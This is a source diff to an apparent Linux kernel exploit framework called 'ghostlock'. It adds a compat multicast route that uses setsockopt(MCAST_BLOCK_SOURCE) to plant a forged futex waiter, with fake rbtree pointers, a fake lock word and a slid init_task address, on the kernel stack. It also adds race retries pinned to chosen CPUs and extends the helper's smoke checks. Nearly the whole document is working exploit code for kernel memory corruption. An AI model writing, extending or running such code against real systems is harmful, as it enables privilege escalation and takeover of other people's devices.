@@ -16,6 +16,7 @@
 #include <array>
 #include <cerrno>
 #include <csignal>
+#include <cstddef>
 #include <cstdio>
 #include <cstring>
 #include <fcntl.h>
@@ -30,6 +31,11 @@ namespace {
     /* The helper must not share fd numbers with the route's 0..319 range. */
     constexpr int32_t kHelperFdBase = 400;
     constexpr int32_t kSmokeTimeoutMs = 30000;
+    /* The compact-retry entry-delay ladder; the first attempt may use the
+     * profile's seed instead. Shared by the select and multicast carriers. */
+    constexpr std::array<uint32_t, 8> kCompatDelayLadder = {
+        50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
+    };
 
     struct HelperProcess final {
         pid_t pid = -1;
@@ -173,9 +179,11 @@ namespace {
                 *helper_signal = WTERMSIG(status);
             }
         }
-        if (ok && result->magic != compat::kResultMagic) {
+        if (ok && (result->magic != compat::kResultMagic ||
+                   result->version != compat::kProtocolVersion)) {
             *error = EBADMSG;
-            pr_warning("compat helper: bad result magic=0x%08x\n", result->magic);
+            pr_warning("compat helper: bad result magic=0x%08x version=%u\n",
+                       result->magic, result->version);
             ok = false;
         }
         return ok;
@@ -221,12 +229,14 @@ namespace {
             return false;
         }
         pr_info("compat helper smoke: exit=%d signal=%d futex=%d timerfd=%d "
-                "newselect=%d sched_setattr=%d pipe2=%d fcntl_high=%d dup2_319=%d prctl=%d\n",
+                "newselect=%d sched_setattr=%d pipe2=%d fcntl_high=%d dup2_319=%d prctl=%d "
+                "futex_time64=%d socket=%d setsockopt=%d\n",
                 helper_exit, helper_signal, result.smoke[0], result.smoke[1],
                 result.smoke[2], result.smoke[3], result.smoke[5], result.smoke[6],
-                result.smoke[4], result.smoke[7]);
+                result.smoke[4], result.smoke[7], result.smoke[8], result.smoke[9],
+                result.smoke[10]);
         bool all_zero = result.status == 0;
-        for (int i = 0; i < 8; i++) {
+        for (int i = 0; i < 11; i++) {
             if (result.smoke[i] != 0) all_zero = false;
         }
         probe_ok = helper_exit == 0 && helper_signal == 0 && all_zero;
@@ -238,13 +248,142 @@ namespace {
         }
         return probe_ok;
     }
+
+    /* The compat multicast variant: the same helper and anchor flow as the
+     * select carrier, but the waiter's park is setsockopt(MCAST_BLOCK_SOURCE)
+     * with the native-built 0x104-byte compat group_source_req. One helper
+     * invocation per attempt; the native owns every kernel address and the
+     * stamp, the helper only calls setsockopt. */
+    bool run_multicast_carrier(const profile::TargetProfile &target,
+                               const profile::MulticastWaiterLayout &layout,
+                               const char *helper_path) noexcept {
+        const uint32_t stamp_bytes = layout.compat_buffer_size.value_or(0);
+        const int32_t waiter_off = layout.compat_waiter_off.value_or(-1);
+        const uint32_t task_offset = layout.task_offset.value_or(0);
+        const uint32_t lock_offset = layout.lock_offset.value_or(0);
+        const uint32_t abi = layout.compat_futex_abi.value_or(0);
+        if (stamp_bytes < memory::kWaiterBytes ||
+            stamp_bytes > ::ghostlock::compat::kCarrierStampBytes ||
+            waiter_off < 0 ||
+            static_cast<uint32_t>(waiter_off) + memory::kWaiterBytes > stamp_bytes ||
+            static_cast<uint32_t>(waiter_off) + lock_offset + 8 > stamp_bytes ||
+            task_offset == 0 || lock_offset == 0 || abi > 1) {
+            pr_error("compat multicast: geometry invalid off=%d buffer=%u task=%u "
+                     "lock=%u abi=%u\n",
+                     waiter_off, stamp_bytes, task_offset, lock_offset, abi);
+            return false;
+        }
+        const int32_t attempts = 4;
+        for (int32_t attempt = 1; attempt <= attempts; attempt++) {
+            uintptr_t lock_word = session::g_exploit_session.heap.current.fake_lock;
+            uintptr_t slot = 0;
+            if (const auto anchor_image = layout.lock_anchor_image) {
+                const uintptr_t anchored = route::anchor::acquire_lock_word(
+                    *anchor_image, layout.lock_anchor_bytes,
+                    layout.lock_anchor_stride, attempt, &slot);
+                if (anchored == 0) {
+                    pr_warning("compat multicast: anchor slots exhausted attempt=%d\n",
+                               attempt);
+                    return false;
+                }
+                lock_word = anchored;
+            }
+            if (lock_word == 0) {
+                pr_warning("compat multicast: no lock word (no anchor and no page)\n");
+                return false;
+            }
+            const memory::PayloadWriteLayout stamp_layout = {
+                .parent = session::g_exploit_session.heap.current.fake_parent,
+                .right = session::g_exploit_session.heap.current.fake_right,
+                .left = session::g_exploit_session.heap.current.fake_left,
+            };
+            const memory::WaiterWords words = memory::waiter_words(
+                stamp_layout, ghostlock::profile::slide_init_task(), lock_word,
+                kernel::waiter_prio_word(
+                    kernel::FAKE_WAITER_PRIO,
+                    target.compact_waiter_has_wake_state()));
+            ::ghostlock::compat::CarrierCommand command;
+            command.mode =
+                static_cast<uint32_t>(::ghostlock::compat::CarrierMode::Multicast);
+            command.futex_abi = abi;
+            command.option = 43U; /* MCAST_BLOCK_SOURCE */
+            command.stamp_bytes = stamp_bytes;
+            command.nfds = ::ghostlock::compat::kCarrierNfds;
+            command.bitmap_bytes = ::ghostlock::compat::kCarrierBitmapBytes;
+            command.select_timeout_us = 0;
+            /* No post-copy delay. The select carrier's ladder positions the
+             * walk inside the waiter's blocking _newselect (the trigger fires
+             * before the syscall); here the trigger is stored after the
+             * setsockopt copy has already returned, and the waiter spins on
+             * the stamped stack -- every microsecond of delay is window for a
+             * context switch to clobber the strip (the +0x188 class; 2026-11-12
+             * the device died in the first attempt's 50 ms ladder rung). */
+            command.delay_us = 0;
+            command.consumer_max_calls = target.select_consumer_max_calls();
+            command.consumer_burst_calls = target.select_consumer_burst_calls();
+            command.waiter_cpu = static_cast<uint32_t>(
+                config::runtime_config_snapshot().main_cpu);
+            command.consumer_cpu = static_cast<uint32_t>(
+                config::runtime_config_snapshot().consumer_cpu);
+            command.route_wait_ms = target.race_route_wait_ms();
+            command.state_poll_us = target.race_state_poll_interval_us();
+            command.route_done_timeout_ms = target.race_route_done_timeout_ms();
+            command.setup_settle_us = target.race_setup_settle_us();
+            std::memset(command.stamp, 0, sizeof(command.stamp));
+            if (!memory::encode_waiter_words(
+                    std::span<std::byte>(
+                        reinterpret_cast<std::byte *>(command.stamp), stamp_bytes),
+                    static_cast<size_t>(waiter_off), words)) {
+                pr_error("compat multicast: stamp does not fit off=%d buffer=%u\n",
+                         waiter_off, stamp_bytes);
+                return false;
+            }
+            int32_t timeout_ms = 600000;
+            if (target.race_route_done_timeout_ms() < 570000U) {
+                timeout_ms = static_cast<int32_t>(
+                    target.race_route_done_timeout_ms() + 30000U);
+            }
+            ::ghostlock::compat::CarrierResult result;
+            int32_t helper_exit = -1;
+            int32_t helper_signal = 0;
+            int32_t delivery_error = 0;
+            if (!run_helper(helper_path, command, timeout_ms, &result, &helper_exit,
+                            &helper_signal, &delivery_error)) {
+                pr_warning("compat multicast attempt=%d/%d delivery failed exit=%d "
+                           "signal=%d errno=%d\n",
+                           attempt, attempts, helper_exit, helper_signal,
+                           delivery_error);
+                return false;
+            }
+            pr_info("compat multicast attempt=%d/%d status=%u step=%d err=%d "
+                    "route=%d errno=%d calls=%d success=%d drain=%d clean=%u/%u "
+                    "slot=%llu lock=%016llx\n",
+                    attempt, attempts, result.status, result.step,
+                    result.error_number, result.route_result, result.route_errno,
+                    result.calls, result.successes, result.drain_ms,
+                    result.userspace_clean, result.kernel_disarmed,
+                    static_cast<unsigned long long>(slot),
+                    static_cast<unsigned long long>(lock_word));
+            if (result.status == 3U) { /* RouteResultCode::DirtyFailure */
+                pr_error("compat multicast: dirty attempt=%d; stopping the run\n",
+                         attempt);
+                support::fail_stop_dirty_race("compat multicast", result.step);
+            }
+            if (result.status == 0U) { /* RouteResultCode::Ok */
+                return true;
+            }
+        }
+        pr_warning("compat multicast: all %d attempt(s) failed\n", attempts);
+        return false;
+    }
 } // namespace
 
 namespace ghostlock::route::compat {
     bool carrier_requested() noexcept {
         const auto &profile = session::g_exploit_session.profile;
         if (!profile.loaded()) return false;
-        return profile.select_stack_layout().compat_carrier.value_or(0) != 0;
+        return profile.select_stack_layout().compat_carrier.value_or(0) != 0 ||
+               profile.multicast_layout().compat_carrier.value_or(0) != 0;
     }
 
     bool run_compat_carrier(const memory::WriteRequest &request) {
@@ -253,8 +392,11 @@ namespace ghostlock::route::compat {
          * startup); a write to its pipe must report EPIPE, not kill us. */
         (void) signal(SIGPIPE, SIG_IGN);
         const auto &exploit_session = session::g_exploit_session;
-        const auto layout = exploit_session.profile.select_stack_layout();
-        if (layout.compat_carrier.value_or(0) == 0) {
+        const auto select_layout = exploit_session.profile.select_stack_layout();
+        const auto multicast_layout = exploit_session.profile.multicast_layout();
+        const bool select_requested = select_layout.compat_carrier.value_or(0) != 0;
+        const bool multicast_requested = multicast_layout.compat_carrier.value_or(0) != 0;
+        if (!select_requested && !multicast_requested) {
             pr_warning("compat carrier: profile did not request it\n");
             return false;
         }
@@ -265,6 +407,16 @@ namespace ghostlock::route::compat {
         if (!smoke_once(::ghostlock::compat::CarrierFutexAbi::Time32)) {
             return false;
         }
+        char path[4096];
+        if (resolve_helper_path(path, sizeof(path)) != 0) {
+            pr_error("compat carrier: cannot resolve the helper path\n");
+            return false;
+        }
+        if (multicast_requested) {
+            return run_multicast_carrier(exploit_session.profile, multicast_layout,
+                                         path);
+        }
+        const auto &layout = select_layout;
         if (!layout.waiter_home.has_value() || !layout.select_dst_depth.has_value()) {
             pr_warning("compat carrier: geometry missing (waiter_home/select_dst_depth)\n");
             return false;
@@ -287,16 +439,8 @@ namespace ghostlock::route::compat {
                 plan.words, static_cast<uint32_t>(plan.futex_abi),
                 plan.zero_tail ? 1 : 0);
 
-        char path[4096];
-        if (resolve_helper_path(path, sizeof(path)) != 0) {
-            pr_error("compat carrier: cannot resolve the helper path\n");
-            return false;
-        }
         const auto &profile = exploit_session.profile;
         const int32_t attempts = layout.compact_waiter.value_or(0) ? 4 : 1;
-        static constexpr std::array<uint32_t, 8> kDelayLadder = {
-            50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
-        };
         for (int32_t attempt = 1; attempt <= attempts; attempt++) {
             uintptr_t lock_word = session::g_exploit_session.heap.current.fake_lock;
             uintptr_t slot = 0;
@@ -332,7 +476,7 @@ namespace ghostlock::route::compat {
             command.select_timeout_us = profile.select_timeout_us();
             command.delay_us = attempt == 1 && profile.select_enter_delay_us() != 0
                                    ? profile.select_enter_delay_us()
-                                   : kDelayLadder[static_cast<size_t>((attempt - 1) % 8)];
+                                   : kCompatDelayLadder[static_cast<size_t>((attempt - 1) % 8)];
             command.consumer_max_calls = profile.select_consumer_max_calls();
             command.consumer_burst_calls = profile.select_consumer_burst_calls();
             command.waiter_cpu = static_cast<uint32_t>(
